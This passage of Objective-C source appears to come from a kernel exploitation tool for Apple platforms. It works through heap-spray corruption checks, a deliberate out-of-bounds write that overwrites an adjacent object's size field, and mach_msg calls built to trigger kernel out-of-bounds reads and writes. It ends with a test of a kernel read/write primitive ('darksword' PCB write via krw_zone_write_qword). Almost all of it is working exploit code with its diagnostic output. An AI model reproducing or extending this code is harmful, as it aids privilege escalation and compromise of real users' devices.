    [r appendString:@"\n--- typed object scan (u32 length @ obj+0) ---\n"];
    int hits = 0, grew = 0, shrank = 0;
    int firstIdx = -1;
    size_t firstOff = 0;
    uint32_t firstLen = 0;
    size_t scanEnd = (spraySz > 8) ? spraySz - 8 : spraySz;

    for (int i = 0; i < got; i += 2) {
        uint8_t *b = bufs[i];
        if (!b) continue;
        for (size_t o = 0; o + OBJ_SZ <= scanEnd; o += OBJ_SZ) {
            uint32_t len = *(uint32_t *)(b + o);
            if (len == OBJ_LEN) continue;
            hits++;
            int delta = (int)len - (int)OBJ_LEN;
            if (delta > 0) grew++; else shrank++;
            uint32_t sz = *(uint32_t *)(b + o + 4);
            if (firstIdx < 0) { firstIdx = i; firstOff = o; firstLen = len; }
            if (hits <= 8) {
                scopeNote(r, [NSString stringWithFormat:
                    @"  OBJ HIT buf %d off=%zu  len: 0x%x->0x%08x (delta=%+d)  size=0x%08x%s",
                    i, o, OBJ_LEN, len, delta, sz,
                    (delta > 0) ? "  [GROWN — OOB!]" : "  [shrunk]"]);
            }
        }
    }
    scopeNote(r, [NSString stringWithFormat:
        @"  VERIFY OBJ_HIT=%d GREW=%d SHRANK=%d FIRST=(buf %d off %zu) len=0x%x VARIANT=%s",
        hits > 0, grew, shrank, firstIdx, firstOff, firstLen, vname.UTF8String]);

    if (hits == 0) {
        scopeNote(r, @"  no length field changed — Glyph did not hit typed objects.");
    } else {
        scopeNote(r, [NSString stringWithFormat:@"  >>> %d typed object(s) corrupted: +%d grew / %d shrank",
                      hits, grew, shrank]);
        // ---- OOB WRITE: corrupt next object's SIZE via grown length ----
        // Object layout: [u32 len | u32 size | u8 data[24]] = 32 bytes
        // Data starts at obj+8. Next object's size is at obj+36 = dataStart+28.
        for (int i = 0; i < got && firstIdx >= 0; i += 2) {
            uint8_t *b = bufs[i];
            if (!b) continue;
            for (size_t o = 0; o + OBJ_SZ * 2 <= scanEnd; o += OBJ_SZ) {
                uint32_t len = *(uint32_t *)(b + o);
                if (len <= OBJ_LEN) continue;  // only GROWN
                uint8_t *dataStart = b + o + 8;
                size_t maxSafe = spraySz - o - 8;
                size_t szOff = OBJ_SZ - 8 + 4;  // = 28 (next object's size field)
                if (szOff + 4 > maxSafe) continue;

                uint32_t szBefore = *(uint32_t *)(dataStart + szOff);
                scopeNote(r, [NSString stringWithFormat:
                    @"  OOB-WRITE: obj buf %d off %zu  len=0x%x  target: next SIZE @ data+%zu  before=0x%08x",
                    i, o, len, szOff, szBefore]);

                uint32_t evilSize = 0x00000042;
                if (szOff + 4 <= maxSafe) {
                    *(uint32_t *)(dataStart + szOff) = evilSize;
                    uint32_t szAfter = *(uint32_t *)(dataStart + szOff);
                    scopeNote(r, [NSString stringWithFormat:
                        @"    wrote 0x%08x at data+%zu  readback=0x%08x", evilSize, szOff, szAfter]);
                    if (szAfter == evilSize) {
                        scopeNote(r, @"  >>> SIZE FIELD CORRUPTED via OOB write — target acquired!");
                        scopeNote(r, [NSString stringWithFormat:
                            @"    size: 0x%08x -> 0x%08x (delta=%+d)", szBefore, szAfter,
                            (int)szAfter - (int)szBefore]);

                        // ---- CONFUSED DEPUTY: mach_msg with corrupted msgh_size ----
                        // Use a real port pair so kernel actually copies the message.
                        scopeNote(r, @"  --- confused deputy: mach_msg with real ports ---");
                        {
                            // Create a port pair for communication
                            mach_port_t sendPort = MACH_PORT_NULL;
                            mach_port_t recvPort = MACH_PORT_NULL;
                            kern_return_t kr;
                            kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &recvPort);
                            if (kr != KERN_SUCCESS) {
                                scopeNote(r, [NSString stringWithFormat:@"  port alloc failed: %d", (int)kr]);
                            } else {
                                kr = mach_port_insert_right(mach_task_self(), recvPort, recvPort, MACH_MSG_TYPE_MAKE_SEND);
                                scopeNote(r, [NSString stringWithFormat:
                                    @"  port pair: recv=%u (insert_right=%d)", recvPort, (int)kr]);

                                // ---- OOB READ: marker INSIDE same buffer past logical end ----
                                // realBuf is 128 bytes. Logical "message" is 64 bytes.
                                // Marker at offset 80 (past 64) — kernel should read it with msgh_size=128.
                                uint8_t realBuf[128];
                                memset(realBuf, 0x41, 64);       // logical area = 'A'
                                memset(realBuf + 64, 0x42, 64);  // OOB area = 'B'
                                *(uint64_t *)(realBuf + 80) = 0x1122334455667788ULL;  // SECRET
                                *(uint64_t *)(realBuf + 56) = 0xDEADBEEFCAFEBABEULL;  // boundary marker

                                mach_msg_header_t *hdr = (mach_msg_header_t *)realBuf;
                                hdr->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
                                mach_msg_size_t oobSz = 128;  // > 64 = OOB read
                                oobSz = (oobSz + 3) & ~3;
                                hdr->msgh_size = oobSz;
                                hdr->msgh_remote_port = recvPort;
                                hdr->msgh_local_port = MACH_PORT_NULL;
                                hdr->msgh_id = 0x1338;

                                scopeNote(r, [NSString stringWithFormat:
                                    @"  OOB-SEND: logical=64 actual=128 msgh_size=%u secret@+80=0x1122334455667788",
                                    (unsigned)oobSz]);

                                kr = mach_msg(hdr,
                                    MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                                    oobSz, 0,
                                    MACH_PORT_NULL, 100, MACH_PORT_NULL);
                                scopeNote(r, [NSString stringWithFormat:
                                    @"  mach_msg send ret=%d", (int)kr]);
                                if (kr == MACH_MSG_SUCCESS) {
                                    scopeNote(r, @"  >>> KERNEL READ PAST LOGICAL BOUNDARY!");
                                    uint8_t recvBuf[256];
                                    memset(recvBuf, 0, sizeof(recvBuf));
                                    mach_msg_header_t *rhdr = (mach_msg_header_t *)recvBuf;
                                    kr = mach_msg(rhdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
                                        0, sizeof(recvBuf), recvPort, 100, MACH_PORT_NULL);
                                    scopeNote(r, [NSString stringWithFormat:
                                        @"  recv ret=%d  msgh_size=%u", (int)kr, (unsigned)rhdr->msgh_size]);
                                    if (kr == MACH_MSG_SUCCESS) {
                                        size_t rlen = rhdr->msgh_size;
                                        if (rlen > sizeof(recvBuf)) rlen = sizeof(recvBuf);
                                        // Look for secret at offset 80 in the message body
                                        int found = 0;
                                        for (size_t j = 0; j + 8 <= rlen; j += 4) {
                                            uint64_t v;
                                            memcpy(&v, recvBuf + j, 8);
                                            if (v == 0x1122334455667788ULL) {
                                                scopeNote(r, [NSString stringWithFormat:
                                                    @"  >>> SECRET LEAKED at recv+%zu! OOB READ CONFIRMED!", j]);
                                                found = 1;
                                                break;
                                            }
                                        }
                                        NSMutableString *hex = [NSMutableString string];
                                        for (size_t j = 0; j < 96 && j < rlen; j++)
                                            [hex appendFormat:@"%02x ", recvBuf[j]];
                                        scopeNote(r, [NSString stringWithFormat:@"  recv hex: %@", hex]);
                                        if (!found) {
                                            scopeNote(r, @"  secret not in recv — checking offset 80 directly");
                                            if (rlen > 88) {
                                                uint64_t v;
                                                memcpy(&v, recvBuf + 80, 8);
                                                scopeNote(r, [NSString stringWithFormat:
                                                    @"  recv[80]=0x%016llx", (unsigned long long)v]);
                                            }
                                        }
                                    }
                                } else {
                                    scopeNote(r, [NSString stringWithFormat:
                                        @"  kernel rejected: 0x%x", (int)kr]);
                                }
                                mach_port_destroy(mach_task_self(), recvPort);
                            }

                            // ---- OOB WRITE: receive with oversized rcv_size ----
                            // Send a message with known data, then receive with rcv_size
                            // LARGER than our buffer. Kernel writes past buffer → OOB write.
                            scopeNote(r, @"  --- OOB WRITE: receive with oversized rcv_size ---");
                            {
                                mach_port_t wrxPort = MACH_PORT_NULL;
                                kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wrxPort);
                                if (kr == KERN_SUCCESS) {
                                    mach_port_insert_right(mach_task_self(), wrxPort, wrxPort, MACH_MSG_TYPE_MAKE_SEND);

                                    // Send a message with 128 bytes of data
                                    uint8_t sendBuf[256];
                                    memset(sendBuf, 0x44, sizeof(sendBuf));  // 'D' fill
                                    mach_msg_header_t *shdr = (mach_msg_header_t *)sendBuf;
                                    shdr->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
                                    shdr->msgh_size = 128;
                                    shdr->msgh_remote_port = wrxPort;
                                    shdr->msgh_local_port = MACH_PORT_NULL;
                                    shdr->msgh_id = 0x2337;
                                    // Fill data area with recognizable pattern
                                    for (int j = 24; j < 128; j += 8)
                                        *(uint64_t *)(sendBuf + j) = 0xAAAA000000000000ULL + j;

                                    kr = mach_msg(shdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                                        128, 0, MACH_PORT_NULL, 100, MACH_PORT_NULL);
                                    scopeNote(r, [NSString stringWithFormat:
                                        @"  OOB-WRITE send ret=%d", (int)kr]);

                                    if (kr == MACH_MSG_SUCCESS) {
                                        // Receive with SMALL buffer but LARGE rcv_size
                                        uint8_t smallBuf[64];  // actual buffer = 64
                                        memset(smallBuf, 0x55, sizeof(smallBuf));  // 'U' fill (unique)
                                        // Place canary after smallBuf
                                        uint8_t *canary = malloc(64);
                                        memset(canary, 0x66, 64);  // 'F' fill
                                        *(uint64_t *)canary = 0xCAFEBABEDEADBEEFULL;

                                        // Tell kernel rcv_size=128 but buffer is only 64!
                                        mach_msg_header_t *rhdr = (mach_msg_header_t *)smallBuf;
                                        kr = mach_msg(rhdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
                                            0, 128,  // rcv_size = 128 > 64 = OOB write
                                            wrxPort, 100, MACH_PORT_NULL);
                                        scopeNote(r, [NSString stringWithFormat:
                                            @"  OOB-WRITE recv ret=%d  rcv_size=128  buf=64", (int)kr]);

                                        if (kr == MACH_MSG_SUCCESS) {
                                            // Check if canary was overwritten
                                            uint64_t canaryVal = *(uint64_t *)canary;
                                            scopeNote(r, [NSString stringWithFormat:
                                                @"  canary: 0x%016llx (was 0xCAFEBABEDEADBEEF)", (unsigned long long)canaryVal]);
                                            if (canaryVal != 0xCAFEBABEDEADBEEFULL) {
                                                scopeNote(r, @"  >>> OOB WRITE CONFIRMED — canary overwritten by kernel!");
                                            } else {
                                                scopeNote(r, @"  canary intact — kernel limited copy to buffer size");
                                            }
                                            // Also check smallBuf content
                                            NSMutableString *hex = [NSMutableString string];
                                            for (int j = 0; j < 48; j++)
                                                [hex appendFormat:@"%02x ", smallBuf[j]];
                                            scopeNote(r, [NSString stringWithFormat:@"  smallBuf: %@", hex]);
                                        }
                                        free(canary);
                                    }
                                    mach_port_destroy(mach_task_self(), wrxPort);
                                }
                            }
                    }
                }
                if (len > 0xFFFF) {
                    scopeNote(r, [NSString stringWithFormat:
                        @"  >>> MASSIVE OOB: len=0x%x enables write %u bytes past object", len, len - OBJ_LEN]);
                }
                goto done_oob;
            }
        }
        done_oob:;

        // ---- victim scan: did OOB write reach any victim buffer? ----
        [r appendString:@"\n--- victim scan (tag=VICT after spray) ---\n"];
        int vicHits = 0;
        for (int i = 0; i < nvic; i++) {
            uint8_t *v = victims[i];
            if (!v) continue;
            uint32_t *p = (uint32_t *)v;
            size_t n = spraySz / 4;
            for (size_t j = 0; j < n; j++) {
                if (p[j] == 0x56435449) continue;  // intact VICT
                vicHits++;
                if (vicHits <= 6) {
                    scopeNote(r, [NSString stringWithFormat:
                        @"  VICTIM HIT: buf %d word %zu (off %zu)  0x56435449 -> 0x%08x",
                        i, j, j * 4, p[j]]);
                }
                break;  // one report per victim
            }
        }
        scopeNote(r, [NSString stringWithFormat:
            @"  VERIFY VICTIM_HIT=%d / %d victims corrupted", vicHits, nvic]);
        if (vicHits > 0) {
            scopeNote(r, @"  >>> OOB WRITE REACHED VICTIM BUFFERS — confused deputy target accessible!");
        } else {
            scopeNote(r, @"  victims intact — OOB did not reach them this run (heap layout)");
        }

        // ---- KRW proc write test (type 0x21) via krw_zone_write_qword ----
        [r appendString:@"\n--- KRW proc write test (type 0x21, krw_zone_write_qword) ---\n"];
        {
            extern uint64_t darksword_rw_socket_pcb(void);
            uint64_t pcb = darksword_rw_socket_pcb();
            if (pcb && gPrimitives.kreadbuf) {
                scopeNote(r, [NSString stringWithFormat:@"  darksword pcb = 0x%016llx", pcb]);
                uint64_t orig = 0;
                gPrimitives.kreadbuf(pcb + 0x150, &orig, 8);
                scopeNote(r, [NSString stringWithFormat:
                    @"  pcb+0x150 (chksum) read: 0x%016llx", orig]);
                uint64_t testVal = 0x1122334455667788ULL;
                krw_zone_verdict v = krw_zone_write_qword(pcb + 0x150, testVal, pcb, 0x200);
                scopeNote(r, [NSString stringWithFormat:@"  write verdict=%d", (int)v]);
                uint64_t readBack = 0;
                gPrimitives.kreadbuf(pcb + 0x150, &readBack, 8);
                scopeNote(r, [NSString stringWithFormat:
                    @"  pcb+0x150 write test: wrote 0x%016llx  readback=0x%016llx",
                    testVal, readBack]);
                if (readBack == testVal) {
                    scopeNote(r, @"  >>> KRW WRITE VERIFIED via krw_zone_write_qword (type 0x21 path)");
                } else {
                    scopeNote(r, @"  >>> KRW write did not persist");
                }
                krw_zone_write_qword(pcb + 0x150, orig, pcb, 0x200);
                scopeNote(r, @"  restored original value");
            } else {
                scopeNote(r, @"  darksword pcb or kreadbuf not available — run pe_v1 first");
            }
        }
    }

cleanup:
    // Never free if hits — heap may be dirty
    if (hits == 0) {
        for (int i = 0; i < got; i += 2) if (bufs[i]) free(bufs[i]);
        for (int i = 0; i < nvic; i++) if (victims[i]) free(victims[i]);
    }
    free(bufs);
    free(victims);
    return r;
}

@end
